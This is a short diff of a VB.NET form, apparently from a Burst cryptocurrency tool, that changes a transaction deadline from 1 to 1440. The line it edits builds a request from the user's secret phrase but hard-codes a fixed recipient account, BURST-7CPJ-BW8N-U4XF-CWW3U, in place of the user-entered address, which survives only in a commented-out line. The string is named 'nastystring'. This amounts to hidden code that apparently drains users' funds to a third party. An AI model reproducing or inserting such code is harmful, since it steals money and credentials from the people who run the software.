@@ -413,7 +413,7 @@ Public Class Form1
                 Dim address = Label3.Text.Replace("#", "")
                 'Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=" & address & "&deadline=1&feeNQT=100000000"
                 Integermarker = 1
-                Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=BURST-7CPJ-BW8N-U4XF-CWW3U" & "&deadline=1&feeNQT=100000000"
+                Dim nastystring As String = "&secretPhrase=" & TextBox1.Text & "&recipient=BURST-7CPJ-BW8N-U4XF-CWW3U" & "&deadline=1440&feeNQT=100000000"
                 Integermarker = 2
                 Dim PostResultExists As Integer = 0
                 If My.Computer.FileSystem.FileExists("c:\Burst.Today\postresult.txt") Then
